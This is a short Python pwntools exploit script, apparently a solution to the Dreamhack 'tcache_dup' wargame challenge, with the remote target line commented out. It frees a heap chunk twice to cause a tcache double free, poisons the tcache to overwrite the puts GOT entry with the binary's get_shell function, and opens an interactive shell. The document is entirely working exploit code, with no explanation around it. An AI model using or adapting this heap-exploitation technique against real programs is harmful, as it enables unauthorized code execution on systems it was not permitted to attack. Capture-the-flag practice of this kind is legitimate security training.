from pwn import *

#p = remote('host3.dreamhack.games', '15163')
p = process('./tcache_dup')
e = ELF('./tcache_dup')
puts_got = e.got['puts']
shell = e.symbols['get_shell']

print(hex(shell))
print(hex(puts_got))

def create(size, data):
  p.sendlineafter(b"> ", b"1")
  p.sendlineafter(b"Size: ", str(size).encode())
  p.sendlineafter(b"Data: ", data)

def delete(idx):
  p.sendlineafter(b"> ", b"2")
  p.sendlineafter(b"idx: ", str(idx).encode())

# [1] double free
create(0x20, b"A")
delete(0)
delete(0)

# [2] puts@got overwrite to shell function
create(0x20, p64(puts_got))
create(0x20, b"A"*8)
create(0x20, p64(shell))

p.interactive()